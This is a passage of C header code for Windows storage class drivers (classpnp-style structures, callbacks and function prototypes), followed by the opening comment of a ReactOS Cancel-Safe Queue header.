typedef struct _CLASS_PRIVATE_PDO_DATA CLASS_PRIVATE_PDO_DATA, *PCLASS_PRIVATE_PDO_DATA;

struct _CLASS_PRIVATE_COMMON_DATA;
typedef struct _CLASS_PRIVATE_COMMON_DATA CLASS_PRIVATE_COMMON_DATA, *PCLASS_PRIVATE_COMMON_DATA;

struct _MEDIA_CHANGE_DETECTION_INFO;
typedef struct _MEDIA_CHANGE_DETECTION_INFO MEDIA_CHANGE_DETECTION_INFO, *PMEDIA_CHANGE_DETECTION_INFO;

typedef struct _DICTIONARY {
  ULONGLONG Signature;
  struct _DICTIONARY_HEADER* List;
  KSPIN_LOCK SpinLock;
} DICTIONARY, *PDICTIONARY;

typedef struct _CLASSPNP_SCAN_FOR_SPECIAL_INFO {
  PCHAR VendorId;
  PCHAR ProductId;
  PCHAR ProductRevision;
  ULONG_PTR Data;
} CLASSPNP_SCAN_FOR_SPECIAL_INFO, *PCLASSPNP_SCAN_FOR_SPECIAL_INFO;

typedef VOID
(NTAPI *PCLASS_ERROR)(
  PDEVICE_OBJECT DeviceObject,
  PSCSI_REQUEST_BLOCK Srb,
  NTSTATUS *Status,
  BOOLEAN *Retry);

typedef NTSTATUS
(NTAPI *PCLASS_ADD_DEVICE)(
  PDRIVER_OBJECT DriverObject,
  PDEVICE_OBJECT Pdo);

typedef NTSTATUS
(NTAPI *PCLASS_POWER_DEVICE)(
  PDEVICE_OBJECT DeviceObject,
  PIRP Irp);

typedef NTSTATUS
(NTAPI *PCLASS_START_DEVICE)(
  PDEVICE_OBJECT DeviceObject);

typedef NTSTATUS
(NTAPI *PCLASS_STOP_DEVICE)(
  PDEVICE_OBJECT DeviceObject,
  UCHAR Type);

typedef NTSTATUS
(NTAPI *PCLASS_INIT_DEVICE)(
  PDEVICE_OBJECT DeviceObject);

typedef NTSTATUS
(NTAPI *PCLASS_ENUM_DEVICE)(
  PDEVICE_OBJECT DeviceObject);

typedef NTSTATUS
(NTAPI *PCLASS_READ_WRITE)(
  PDEVICE_OBJECT DeviceObject,
  PIRP Irp);

typedef NTSTATUS
(NTAPI *PCLASS_DEVICE_CONTROL)(
  PDEVICE_OBJECT DeviceObject,
  PIRP Irp);

typedef NTSTATUS
(NTAPI *PCLASS_SHUTDOWN_FLUSH)(
  PDEVICE_OBJECT DeviceObject,
  PIRP Irp);

typedef NTSTATUS
(NTAPI *PCLASS_CREATE_CLOSE)(
  PDEVICE_OBJECT DeviceObject,
  PIRP Irp);

typedef NTSTATUS
(NTAPI *PCLASS_QUERY_ID)(
  PDEVICE_OBJECT DeviceObject,
  BUS_QUERY_ID_TYPE IdType,
  PUNICODE_STRING IdString);

typedef NTSTATUS
(NTAPI *PCLASS_REMOVE_DEVICE)(
  PDEVICE_OBJECT DeviceObject,
  UCHAR Type);

typedef VOID
(NTAPI *PCLASS_UNLOAD)(
  PDRIVER_OBJECT DriverObject);

typedef NTSTATUS
(NTAPI *PCLASS_QUERY_PNP_CAPABILITIES)(
  PDEVICE_OBJECT PhysicalDeviceObject,
  PDEVICE_CAPABILITIES Capabilities);

typedef VOID
(NTAPI *PCLASS_TICK)(
  PDEVICE_OBJECT DeviceObject);

typedef NTSTATUS
(NTAPI *PCLASS_QUERY_WMI_REGINFO_EX)(
  PDEVICE_OBJECT DeviceObject,
  ULONG *RegFlags,
  PUNICODE_STRING Name,
  PUNICODE_STRING MofResouceName);

typedef NTSTATUS
(NTAPI *PCLASS_QUERY_WMI_REGINFO)(
  PDEVICE_OBJECT DeviceObject,
  ULONG *RegFlags,
  PUNICODE_STRING Name);

typedef NTSTATUS
(NTAPI *PCLASS_QUERY_WMI_DATABLOCK)(
  PDEVICE_OBJECT DeviceObject,
  PIRP Irp,
  ULONG GuidIndex,
  ULONG BufferAvail,
  PUCHAR Buffer);

typedef NTSTATUS
(NTAPI *PCLASS_SET_WMI_DATABLOCK)(
  PDEVICE_OBJECT DeviceObject,
  PIRP Irp,
  ULONG GuidIndex,
  ULONG BufferSize,
  PUCHAR Buffer);

typedef NTSTATUS
(NTAPI *PCLASS_SET_WMI_DATAITEM)(
  PDEVICE_OBJECT DeviceObject,
  PIRP Irp,
  ULONG GuidIndex,
  ULONG DataItemId,
  ULONG BufferSize,
  PUCHAR Buffer);

typedef NTSTATUS
(NTAPI *PCLASS_EXECUTE_WMI_METHOD)(
  PDEVICE_OBJECT DeviceObject,
  PIRP Irp,
  ULONG GuidIndex,
  ULONG MethodId,
  ULONG InBufferSize,
  ULONG OutBufferSize,
  PUCHAR Buffer);

typedef NTSTATUS
(NTAPI *PCLASS_WMI_FUNCTION_CONTROL)(
  PDEVICE_OBJECT DeviceObject,
  PIRP Irp,
  ULONG GuidIndex,
  CLASSENABLEDISABLEFUNCTION Function,
  BOOLEAN Enable);

typedef struct _SRB_HISTORY_ITEM {
  LARGE_INTEGER TickCountSent;
  LARGE_INTEGER TickCountCompleted;
  ULONG MillisecondsDelayOnRetry;
  SENSE_DATA NormalizedSenseData;
  UCHAR SrbStatus;
  UCHAR ClassDriverUse;
} SRB_HISTORY_ITEM, *PSRB_HISTORY_ITEM;

typedef struct _SRB_HISTORY {
  ULONG_PTR ClassDriverUse[4];
  ULONG TotalHistoryCount;
  ULONG UsedHistoryCount;
  SRB_HISTORY_ITEM History[1];
} SRB_HISTORY, *PSRB_HISTORY;

typedef BOOLEAN
(NTAPI *PCLASS_INTERPRET_SENSE_INFO)(
  PDEVICE_OBJECT Fdo,
  PIRP OriginalRequest,
  PSCSI_REQUEST_BLOCK Srb,
  UCHAR MajorFunctionCode,
  ULONG IoDeviceCode,
  ULONG PreviousRetryCount,
  SRB_HISTORY *RequestHistory,
  NTSTATUS *Status,
  LONGLONG *RetryIn100nsUnits);

typedef VOID
(NTAPI *PCLASS_COMPRESS_RETRY_HISTORY_DATA)(
  PDEVICE_OBJECT DeviceObject,
  PSRB_HISTORY RequestHistory);

typedef struct {
  GUID Guid;
  ULONG InstanceCount;
  ULONG Flags;
} GUIDREGINFO, *PGUIDREGINFO;

typedef struct _CLASS_WMI_INFO {
  ULONG GuidCount;
  PGUIDREGINFO GuidRegInfo;
  PCLASS_QUERY_WMI_REGINFO ClassQueryWmiRegInfo;
  PCLASS_QUERY_WMI_DATABLOCK ClassQueryWmiDataBlock;
  PCLASS_SET_WMI_DATABLOCK ClassSetWmiDataBlock;
  PCLASS_SET_WMI_DATAITEM ClassSetWmiDataItem;
  PCLASS_EXECUTE_WMI_METHOD ClassExecuteWmiMethod;
  PCLASS_WMI_FUNCTION_CONTROL ClassWmiFunctionControl;
} CLASS_WMI_INFO, *PCLASS_WMI_INFO;

typedef struct _CLASS_DEV_INFO {
  ULONG DeviceExtensionSize;
  DEVICE_TYPE DeviceType;
  UCHAR StackSize;
  ULONG DeviceCharacteristics;
  PCLASS_ERROR ClassError;
  PCLASS_READ_WRITE ClassReadWriteVerification;
  PCLASS_DEVICE_CONTROL ClassDeviceControl;
  PCLASS_SHUTDOWN_FLUSH ClassShutdownFlush;
  PCLASS_CREATE_CLOSE ClassCreateClose;
  PCLASS_INIT_DEVICE ClassInitDevice;
  PCLASS_START_DEVICE ClassStartDevice;
  PCLASS_POWER_DEVICE ClassPowerDevice;
  PCLASS_STOP_DEVICE ClassStopDevice;
  PCLASS_REMOVE_DEVICE ClassRemoveDevice;
  PCLASS_QUERY_PNP_CAPABILITIES ClassQueryPnpCapabilities;
  CLASS_WMI_INFO ClassWmiInfo;
} CLASS_DEV_INFO, *PCLASS_DEV_INFO;

struct _CLASS_INIT_DATA {
  ULONG InitializationDataSize;
  CLASS_DEV_INFO FdoData;
  CLASS_DEV_INFO PdoData;
  PCLASS_ADD_DEVICE ClassAddDevice;
  PCLASS_ENUM_DEVICE ClassEnumerateDevice;
  PCLASS_QUERY_ID ClassQueryId;
  PDRIVER_STARTIO ClassStartIo;
  PCLASS_UNLOAD ClassUnload;
  PCLASS_TICK ClassTick;
};

typedef struct _FILE_OBJECT_EXTENSION {
  PFILE_OBJECT FileObject;
  PDEVICE_OBJECT DeviceObject;
  ULONG LockCount;
  ULONG McnDisableCount;
} FILE_OBJECT_EXTENSION, *PFILE_OBJECT_EXTENSION;

typedef struct _CLASS_WORKING_SET {
  ULONG Size;
  ULONG XferPacketsWorkingSetMaximum;
  ULONG XferPacketsWorkingSetMinimum;
} CLASS_WORKING_SET, *PCLASS_WORKING_SET;

typedef struct _CLASS_INTERPRET_SENSE_INFO2 {
  ULONG Size;
  ULONG HistoryCount;
  PCLASS_COMPRESS_RETRY_HISTORY_DATA Compress;
  PCLASS_INTERPRET_SENSE_INFO Interpret;
} CLASS_INTERPRET_SENSE_INFO2, *PCLASS_INTERPRET_SENSE_INFO2;

C_ASSERT((MAXULONG - sizeof(SRB_HISTORY)) / 30000 >= sizeof(SRB_HISTORY_ITEM));

typedef struct _CLASS_DRIVER_EXTENSION {
  UNICODE_STRING RegistryPath;
  CLASS_INIT_DATA InitData;
  ULONG DeviceCount;
#if (NTDDI_VERSION >= NTDDI_WINXP)
  PCLASS_QUERY_WMI_REGINFO_EX ClassFdoQueryWmiRegInfoEx;
  PCLASS_QUERY_WMI_REGINFO_EX ClassPdoQueryWmiRegInfoEx;
#endif
#if (NTDDI_VERSION >= NTDDI_VISTA)
  REGHANDLE EtwHandle;
  PDRIVER_DISPATCH DeviceMajorFunctionTable[IRP_MJ_MAXIMUM_FUNCTION + 1];
  PDRIVER_DISPATCH MpDeviceMajorFunctionTable[IRP_MJ_MAXIMUM_FUNCTION + 1];
  PCLASS_INTERPRET_SENSE_INFO2 InterpretSenseInfo;
  PCLASS_WORKING_SET WorkingSet;
#endif
} CLASS_DRIVER_EXTENSION, *PCLASS_DRIVER_EXTENSION;

typedef struct _COMMON_DEVICE_EXTENSION {
  ULONG Version;
  PDEVICE_OBJECT DeviceObject;
  PDEVICE_OBJECT LowerDeviceObject;
  struct _FUNCTIONAL_DEVICE_EXTENSION *PartitionZeroExtension;
  PCLASS_DRIVER_EXTENSION DriverExtension;
  LONG RemoveLock;
  KEVENT RemoveEvent;
  KSPIN_LOCK RemoveTrackingSpinlock;
  PVOID RemoveTrackingList;
  LONG RemoveTrackingUntrackedCount;
  PVOID DriverData;
  _ANONYMOUS_STRUCT struct {
    BOOLEAN IsFdo:1;
    BOOLEAN IsInitialized:1;
    BOOLEAN IsSrbLookasideListInitialized:1;
  } DUMMYSTRUCTNAME;
  UCHAR PreviousState;
  UCHAR CurrentState;
  ULONG IsRemoved;
  UNICODE_STRING DeviceName;
  struct _PHYSICAL_DEVICE_EXTENSION *ChildList;
  ULONG PartitionNumber;
  LARGE_INTEGER PartitionLength;
  LARGE_INTEGER StartingOffset;
  PCLASS_DEV_INFO DevInfo;
  ULONG PagingPathCount;
  ULONG DumpPathCount;
  ULONG HibernationPathCount;
  KEVENT PathCountEvent;
#ifndef ALLOCATE_SRB_FROM_POOL
  NPAGED_LOOKASIDE_LIST SrbLookasideList;
#endif
  UNICODE_STRING MountedDeviceInterfaceName;
  ULONG GuidCount;
  PGUIDREGINFO GuidRegInfo;
  DICTIONARY FileObjectDictionary;
#if (NTDDI_VERSION >= NTDDI_WINXP)
  PCLASS_PRIVATE_COMMON_DATA PrivateCommonData;
#else
  ULONG_PTR Reserved1;
#endif
#if (NTDDI_VERSION >= NTDDI_VISTA)
  PDRIVER_DISPATCH *DispatchTable;
#else
  ULONG_PTR Reserved2;
#endif
  ULONG_PTR Reserved3;
  ULONG_PTR Reserved4;
} COMMON_DEVICE_EXTENSION, *PCOMMON_DEVICE_EXTENSION;

typedef struct _PHYSICAL_DEVICE_EXTENSION {
  _ANONYMOUS_UNION union {
    _ANONYMOUS_STRUCT struct {
      ULONG Version;
      PDEVICE_OBJECT DeviceObject;
    } DUMMYSTRUCTNAME;
    COMMON_DEVICE_EXTENSION CommonExtension;
  } DUMMYUNIONNAME;
  BOOLEAN IsMissing;
  BOOLEAN IsEnumerated;
#if (NTDDI_VERSION >= NTDDI_WINXP)
  PCLASS_PRIVATE_PDO_DATA PrivatePdoData;
#else
  ULONG_PTR Reserved1;
#endif
  ULONG_PTR Reserved2;
  ULONG_PTR Reserved3;
  ULONG_PTR Reserved4;
} PHYSICAL_DEVICE_EXTENSION, *PPHYSICAL_DEVICE_EXTENSION;

typedef struct _CLASS_POWER_OPTIONS {
  ULONG PowerDown:1;
  ULONG LockQueue:1;
  ULONG HandleSpinDown:1;
  ULONG HandleSpinUp:1;
  ULONG Reserved:27;
} CLASS_POWER_OPTIONS, *PCLASS_POWER_OPTIONS;

typedef struct _CLASS_POWER_CONTEXT {
  union {
    CLASS_POWER_DOWN_STATE PowerDown;
    CLASS_POWER_DOWN_STATE2 PowerDown2;
    CLASS_POWER_UP_STATE PowerUp;
  } PowerChangeState;
  CLASS_POWER_OPTIONS Options;
  BOOLEAN InUse;
  BOOLEAN QueueLocked;
  NTSTATUS FinalStatus;
  ULONG RetryCount;
  ULONG RetryInterval;
  PIO_COMPLETION_ROUTINE CompletionRoutine;
  PDEVICE_OBJECT DeviceObject;
  PIRP Irp;
  SCSI_REQUEST_BLOCK Srb;
} CLASS_POWER_CONTEXT, *PCLASS_POWER_CONTEXT;

typedef struct _COMPLETION_CONTEXT {
  PDEVICE_OBJECT DeviceObject;
  SCSI_REQUEST_BLOCK Srb;
} COMPLETION_CONTEXT, *PCOMPLETION_CONTEXT;

SCSIPORTAPI
ULONG
NTAPI
ClassInitialize(
  PVOID Argument1,
  PVOID Argument2,
  PCLASS_INIT_DATA InitializationData);

typedef struct _CLASS_QUERY_WMI_REGINFO_EX_LIST {
  ULONG Size;
  PCLASS_QUERY_WMI_REGINFO_EX ClassFdoQueryWmiRegInfoEx;
  PCLASS_QUERY_WMI_REGINFO_EX ClassPdoQueryWmiRegInfoEx;
} CLASS_QUERY_WMI_REGINFO_EX_LIST, *PCLASS_QUERY_WMI_REGINFO_EX_LIST;

typedef struct _FUNCTIONAL_DEVICE_EXTENSION {
  _ANONYMOUS_UNION union {
    _ANONYMOUS_STRUCT struct {
      ULONG Version;
      PDEVICE_OBJECT DeviceObject;
    } DUMMYSTRUCTNAME;
    COMMON_DEVICE_EXTENSION CommonExtension;
  } DUMMYUNIONNAME;
  PDEVICE_OBJECT LowerPdo;
  PSTORAGE_DEVICE_DESCRIPTOR DeviceDescriptor;
  PSTORAGE_ADAPTER_DESCRIPTOR AdapterDescriptor;
  DEVICE_POWER_STATE DevicePowerState;
  ULONG DMByteSkew;
  ULONG DMSkew;
  BOOLEAN DMActive;
  DISK_GEOMETRY DiskGeometry;
  PSENSE_DATA SenseData;
  ULONG TimeOutValue;
  ULONG DeviceNumber;
  ULONG SrbFlags;
  ULONG ErrorCount;
  LONG LockCount;
  LONG ProtectedLockCount;
  LONG InternalLockCount;
  KEVENT EjectSynchronizationEvent;
  USHORT DeviceFlags;
  UCHAR SectorShift;
#if (NTDDI_VERSION >= NTDDI_VISTA)
  UCHAR CdbForceUnitAccess;
#else
  UCHAR ReservedByte;
#endif
  PMEDIA_CHANGE_DETECTION_INFO MediaChangeDetectionInfo;
  PKEVENT Unused1;
  HANDLE Unused2;
  FILE_OBJECT_EXTENSION KernelModeMcnContext;
  ULONG MediaChangeCount;
  HANDLE DeviceDirectory;
  KSPIN_LOCK ReleaseQueueSpinLock;
  PIRP ReleaseQueueIrp;
  SCSI_REQUEST_BLOCK ReleaseQueueSrb;
  BOOLEAN ReleaseQueueNeeded;
  BOOLEAN ReleaseQueueInProgress;
  BOOLEAN ReleaseQueueIrpFromPool;
  BOOLEAN FailurePredicted;
  ULONG FailureReason;
  struct _FAILURE_PREDICTION_INFO* FailurePredictionInfo;
  BOOLEAN PowerDownInProgress;
  ULONG EnumerationInterlock;
  KEVENT ChildLock;
  PKTHREAD ChildLockOwner;
  ULONG ChildLockAcquisitionCount;
  ULONG ScanForSpecialFlags;
  KDPC PowerRetryDpc;
  KTIMER PowerRetryTimer;
  CLASS_POWER_CONTEXT PowerContext;

#if (NTDDI_VERSION <= NTDDI_WIN2K)

#if (SPVER(NTDDI_VERSION) < 2))
  ULONG_PTR Reserved1;
  ULONG_PTR Reserved2;
  ULONG_PTR Reserved3;
  ULONG_PTR Reserved4;
#else
  ULONG CompletionSuccessCount;
  ULONG SavedSrbFlags;
  ULONG SavedErrorCount;
  ULONG_PTR Reserved1;
#endif

#else /* (NTDDI_VERSION <= NTDDI_WIN2K) */

  PCLASS_PRIVATE_FDO_DATA PrivateFdoData;
  ULONG_PTR Reserved2;
  ULONG_PTR Reserved3;
  ULONG_PTR Reserved4;

#endif /* (NTDDI_VERSION <= NTDDI_WIN2K) */

} FUNCTIONAL_DEVICE_EXTENSION, *PFUNCTIONAL_DEVICE_EXTENSION;

SCSIPORTAPI
ULONG
NTAPI
ClassInitializeEx(
  PDRIVER_OBJECT DriverObject,
  LPGUID Guid,
  PVOID Data);

SCSIPORTAPI
NTSTATUS
NTAPI
ClassCreateDeviceObject(
  PDRIVER_OBJECT DriverObject,
  PCCHAR ObjectNameBuffer,
  PDEVICE_OBJECT LowerDeviceObject,
  BOOLEAN IsFdo,
  PDEVICE_OBJECT *DeviceObject);

SCSIPORTAPI
NTSTATUS
NTAPI
ClassReadDriveCapacity(
  PDEVICE_OBJECT DeviceObject);

SCSIPORTAPI
VOID
NTAPI
ClassReleaseQueue(
  PDEVICE_OBJECT DeviceObject);

SCSIPORTAPI
VOID
NTAPI
ClassSplitRequest(
  PDEVICE_OBJECT DeviceObject,
  PIRP Irp,
  ULONG MaximumBytes);

SCSIPORTAPI
NTSTATUS
NTAPI
ClassDeviceControl(
  PDEVICE_OBJECT DeviceObject,
  PIRP Irp);

SCSIPORTAPI
NTSTATUS
NTAPI
ClassIoComplete(
  PDEVICE_OBJECT DeviceObject,
  PIRP Irp,
  PVOID Context);

SCSIPORTAPI
NTSTATUS
NTAPI
ClassIoCompleteAssociated(
  PDEVICE_OBJECT DeviceObject,
  PIRP Irp,
  PVOID Context);

SCSIPORTAPI
BOOLEAN
NTAPI
ClassInterpretSenseInfo(
  PDEVICE_OBJECT DeviceObject,
  PSCSI_REQUEST_BLOCK Srb,
  UCHAR MajorFunctionCode,
  ULONG IoDeviceCode,
  ULONG RetryCount,
  NTSTATUS *Status,
  ULONG *RetryInterval);

VOID
NTAPI
ClassSendDeviceIoControlSynchronous(
  ULONG IoControlCode,
  PDEVICE_OBJECT TargetDeviceObject,
  PVOID Buffer,
  ULONG InputBufferLength,
  ULONG OutputBufferLength,
  BOOLEAN InternalDeviceIoControl,
  PIO_STATUS_BLOCK IoStatus);

SCSIPORTAPI
NTSTATUS
NTAPI
ClassSendIrpSynchronous(
  PDEVICE_OBJECT TargetDeviceObject,
  PIRP Irp);

SCSIPORTAPI
NTSTATUS
NTAPI
ClassForwardIrpSynchronous(
  PCOMMON_DEVICE_EXTENSION CommonExtension,
  PIRP Irp);

SCSIPORTAPI
NTSTATUS
NTAPI
ClassSendSrbSynchronous(
  PDEVICE_OBJECT DeviceObject,
  PSCSI_REQUEST_BLOCK Srb,
  PVOID BufferAddress,
  ULONG BufferLength,
  BOOLEAN WriteToDevice);

SCSIPORTAPI
NTSTATUS
NTAPI
ClassSendSrbAsynchronous(
  PDEVICE_OBJECT DeviceObject,
  PSCSI_REQUEST_BLOCK Srb,
  PIRP Irp,
  PVOID BufferAddress,
  ULONG BufferLength,
  BOOLEAN WriteToDevice);

SCSIPORTAPI
NTSTATUS
NTAPI
ClassBuildRequest(
  PDEVICE_OBJECT DeviceObject,
  PIRP Irp);

SCSIPORTAPI
ULONG
NTAPI
ClassModeSense(
  PDEVICE_OBJECT DeviceObject,
  PCHAR ModeSenseBuffer,
  ULONG Length,
  UCHAR PageMode);

SCSIPORTAPI
PVOID
NTAPI
ClassFindModePage(
  PCHAR ModeSenseBuffer,
  ULONG Length,
  UCHAR PageMode,
  BOOLEAN Use6Byte);

SCSIPORTAPI
NTSTATUS
NTAPI
ClassClaimDevice(
  PDEVICE_OBJECT LowerDeviceObject,
  BOOLEAN Release);
  
SCSIPORTAPI
NTSTATUS
NTAPI
ClassInternalIoControl (
  PDEVICE_OBJECT DeviceObject,
  PIRP Irp);

SCSIPORTAPI
VOID
NTAPI
ClassInitializeSrbLookasideList(
  PCOMMON_DEVICE_EXTENSION CommonExtension,
  ULONG NumberElements);

SCSIPORTAPI
VOID
NTAPI
ClassDeleteSrbLookasideList(
  PCOMMON_DEVICE_EXTENSION CommonExtension);

SCSIPORTAPI
ULONG
NTAPI
ClassQueryTimeOutRegistryValue(
  PDEVICE_OBJECT DeviceObject);

SCSIPORTAPI
NTSTATUS
NTAPI
ClassGetDescriptor(
  PDEVICE_OBJECT DeviceObject,
  PSTORAGE_PROPERTY_ID PropertyId,
  PSTORAGE_DESCRIPTOR_HEADER *Descriptor);

SCSIPORTAPI
VOID
NTAPI
ClassInvalidateBusRelations(
  PDEVICE_OBJECT Fdo);

SCSIPORTAPI
VOID
NTAPI
ClassMarkChildrenMissing(
  PFUNCTIONAL_DEVICE_EXTENSION Fdo);

SCSIPORTAPI
BOOLEAN
NTAPI
ClassMarkChildMissing(
  PPHYSICAL_DEVICE_EXTENSION PdoExtension,
  BOOLEAN AcquireChildLock);

SCSIPORTAPI
VOID
ClassDebugPrint(
  CLASS_DEBUG_LEVEL DebugPrintLevel,
  PCCHAR DebugMessage,
  ...);

SCSIPORTAPI
PCLASS_DRIVER_EXTENSION
NTAPI
ClassGetDriverExtension(
  PDRIVER_OBJECT DriverObject);

SCSIPORTAPI
VOID
NTAPI
ClassCompleteRequest(
  PDEVICE_OBJECT DeviceObject,
  PIRP Irp,
  CCHAR PriorityBoost);

SCSIPORTAPI
VOID
NTAPI
ClassReleaseRemoveLock(
  PDEVICE_OBJECT DeviceObject,
  PIRP Tag);

SCSIPORTAPI
ULONG
NTAPI
ClassAcquireRemoveLockEx(
  PDEVICE_OBJECT DeviceObject,
  PVOID Tag,
  PCSTR File,
  ULONG Line);

SCSIPORTAPI
VOID
NTAPI
ClassUpdateInformationInRegistry(
  PDEVICE_OBJECT Fdo,
  PCHAR DeviceName,
  ULONG DeviceNumber,
  PINQUIRYDATA InquiryData,
  ULONG InquiryDataLength);

SCSIPORTAPI
NTSTATUS
NTAPI
ClassWmiCompleteRequest(
  PDEVICE_OBJECT DeviceObject,
  PIRP Irp,
  NTSTATUS Status,
  ULONG BufferUsed,
  CCHAR PriorityBoost);

SCSIPORTAPI
NTSTATUS
NTAPI
ClassWmiFireEvent(
  PDEVICE_OBJECT DeviceObject,
  LPGUID Guid,
  ULONG InstanceIndex,
  ULONG EventDataSize,
  PVOID EventData);

SCSIPORTAPI
VOID
NTAPI
ClassResetMediaChangeTimer(
  PFUNCTIONAL_DEVICE_EXTENSION FdoExtension);

SCSIPORTAPI
VOID
NTAPI
ClassInitializeMediaChangeDetection(
  PFUNCTIONAL_DEVICE_EXTENSION FdoExtension,
  PUCHAR EventPrefix);

SCSIPORTAPI
NTSTATUS
NTAPI
ClassInitializeTestUnitPolling(
  PFUNCTIONAL_DEVICE_EXTENSION FdoExtension,
  BOOLEAN AllowDriveToSleep);

SCSIPORTAPI
PVPB
NTAPI
ClassGetVpb(
  PDEVICE_OBJECT DeviceObject);

SCSIPORTAPI
NTSTATUS
NTAPI
ClassSpinDownPowerHandler(
  PDEVICE_OBJECT DeviceObject,
  PIRP Irp);

NTSTATUS
NTAPI
ClassStopUnitPowerHandler(
  PDEVICE_OBJECT DeviceObject,
  PIRP Irp);

NTSTATUS
NTAPI
ClassSetFailurePredictionPoll(
  PFUNCTIONAL_DEVICE_EXTENSION FdoExtension,
  FAILURE_PREDICTION_METHOD FailurePredictionMethod,
  ULONG PollingPeriod);

VOID
NTAPI
ClassNotifyFailurePredicted(
  PFUNCTIONAL_DEVICE_EXTENSION FdoExtension,
  PUCHAR Buffer,
  ULONG BufferSize,
  BOOLEAN LogError,
  ULONG UniqueErrorValue,
  UCHAR PathId,
  UCHAR TargetId,
  UCHAR Lun);

SCSIPORTAPI
VOID
NTAPI
ClassAcquireChildLock(
  PFUNCTIONAL_DEVICE_EXTENSION FdoExtension);

SCSIPORTAPI
VOID
NTAPI
ClassReleaseChildLock(
  PFUNCTIONAL_DEVICE_EXTENSION FdoExtension);

NTSTATUS
NTAPI
ClassSignalCompletion(
  PDEVICE_OBJECT DeviceObject,
  PIRP Irp,
  PKEVENT Event);

VOID
NTAPI
ClassSendStartUnit(
  PDEVICE_OBJECT DeviceObject);

SCSIPORTAPI
NTSTATUS
NTAPI
ClassRemoveDevice(
  PDEVICE_OBJECT DeviceObject,
  UCHAR RemoveType);

SCSIPORTAPI
NTSTATUS
NTAPI
ClassAsynchronousCompletion(
  PDEVICE_OBJECT DeviceObject,
  PIRP Irp,
  PVOID Event);

SCSIPORTAPI
VOID
NTAPI
ClassCheckMediaState(
  PFUNCTIONAL_DEVICE_EXTENSION FdoExtension);

SCSIPORTAPI
NTSTATUS
NTAPI
ClassCheckVerifyComplete(
  PDEVICE_OBJECT DeviceObject,
  PIRP Irp,
  PVOID Context);

SCSIPORTAPI
VOID
NTAPI
ClassSetMediaChangeState(
  PFUNCTIONAL_DEVICE_EXTENSION FdoExtension,
  MEDIA_CHANGE_DETECTION_STATE State,
  BOOLEAN Wait);

SCSIPORTAPI
VOID
NTAPI
ClassEnableMediaChangeDetection(
  PFUNCTIONAL_DEVICE_EXTENSION FdoExtension);

SCSIPORTAPI
VOID
NTAPI
ClassDisableMediaChangeDetection(
  PFUNCTIONAL_DEVICE_EXTENSION FdoExtension);

SCSIPORTAPI
VOID
NTAPI
ClassCleanupMediaChangeDetection(
  PFUNCTIONAL_DEVICE_EXTENSION FdoExtension);

VOID
NTAPI
ClassGetDeviceParameter(
  PFUNCTIONAL_DEVICE_EXTENSION FdoExtension,
  PWSTR SubkeyName,
  PWSTR ParameterName,
  PULONG ParameterValue);

NTSTATUS
NTAPI
ClassSetDeviceParameter(
  PFUNCTIONAL_DEVICE_EXTENSION FdoExtension,
  PWSTR SubkeyName,
  PWSTR ParameterName,
  ULONG ParameterValue);

#if (NTDDI_VERSION >= NTDDI_VISTA)

PFILE_OBJECT_EXTENSION
NTAPI
ClassGetFsContext(
  PCOMMON_DEVICE_EXTENSION CommonExtension,
  PFILE_OBJECT FileObject);

VOID
NTAPI
ClassSendNotification(
  PFUNCTIONAL_DEVICE_EXTENSION FdoExtension,
  const GUID *Guid,
  ULONG ExtraDataSize,
  PVOID ExtraData);

#endif /* (NTDDI_VERSION >= NTDDI_VISTA) */

static __inline
BOOLEAN
PORT_ALLOCATED_SENSE(
  PFUNCTIONAL_DEVICE_EXTENSION FdoExtension,
  PSCSI_REQUEST_BLOCK Srb)
{
  return ((BOOLEAN)((TEST_FLAG(Srb->SrbFlags, SRB_FLAGS_PORT_DRIVER_ALLOCSENSE) &&
          TEST_FLAG(Srb->SrbFlags, SRB_FLAGS_FREE_SENSE_BUFFER))                &&
          (Srb->SenseInfoBuffer != FdoExtension->SenseData)));
}

static __inline
VOID
FREE_PORT_ALLOCATED_SENSE_BUFFER(
  PFUNCTIONAL_DEVICE_EXTENSION FdoExtension,
  PSCSI_REQUEST_BLOCK Srb)
{
  ASSERT(TEST_FLAG(Srb->SrbFlags, SRB_FLAGS_PORT_DRIVER_ALLOCSENSE));
  ASSERT(TEST_FLAG(Srb->SrbFlags, SRB_FLAGS_FREE_SENSE_BUFFER));
  ASSERT(Srb->SenseInfoBuffer != FdoExtension->SenseData);

  ExFreePool(Srb->SenseInfoBuffer);
  Srb->SenseInfoBuffer = FdoExtension->SenseData;
  Srb->SenseInfoBufferLength = SENSE_BUFFER_SIZE;
  CLEAR_FLAG(Srb->SrbFlags, SRB_FLAGS_FREE_SENSE_BUFFER);
  return;
}

typedef VOID
(NTAPI *PCLASS_SCAN_FOR_SPECIAL_HANDLER)(
  PFUNCTIONAL_DEVICE_EXTENSION FdoExtension,
  ULONG_PTR Data);

VOID
NTAPI
ClassScanForSpecial(
  PFUNCTIONAL_DEVICE_EXTENSION FdoExtension,
  CLASSPNP_SCAN_FOR_SPECIAL_INFO DeviceList[],
  PCLASS_SCAN_FOR_SPECIAL_HANDLER Function);

```

`include/ddk/csq.h`:

```h
/*
 * Cancel-Safe Queue Library
 * Created in 2004 by Vizzini (vizzini@plasmic.com)
 *
 * THIS SOFTWARE IS NOT COPYRIGHTED
 *
 * This source code is offered for use in the public domain. You may
 * use, modify or distribute it freely.
 *
 * This code is distributed in the hope that it will be useful but
 * WITHOUT ANY WARRANTY. ALL WARRANTIES, EXPRESS OR IMPLIED ARE HEREBY
 * DISCLAIMED. This includes but is not limited to warranties of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 *
 * This header defines the interface to the ReactOS Cancel-Safe Queue library.
 * This interface is based on and is similar to the Microsoft Cancel-Safe
 * Queue interface.
 *
 * BACKGROUND
 *
 * IRP queuing is a royal pain in the butt, due to the fact that there are
 * tons of built-in race conditions.  IRP handling is difficult in general,
 * but the cancel logic has been particularly complicated due to some subtle
 * races, coupled with the fact that the system interfaces have changed over
 * time.
 *
 * Walter Oney (2nd. Ed. of Programming the Windows Driver Model) states a
 * common opinion among driver developers when he says that it is foolish
 * to try to roll your own cancel logic.  There are only a very few people
 * who have gotten it right in the past.  He suggests, instead, that you
 * either use his own well-tested code, or use the code in the Microsoft
 * Cancel-Safe Queue Library.
 *
 * We cannot do either, of course, due to copyright issues.  I have therefore
 * created this clone of the Microsoft library in order to concentrate all
 * of the IRP-queuing bugs in one place.  I'm quite sure there are problems
 * here, so if you are a driver writer, I'd be glad to hear your feedback.
 *
 * Apart from that, please try to use these routines, rather than building
 * your own.  If you think you have found a bug, please bring it up with me
 * or on-list, as this is complicated and non-obvious stuff.  Don't just
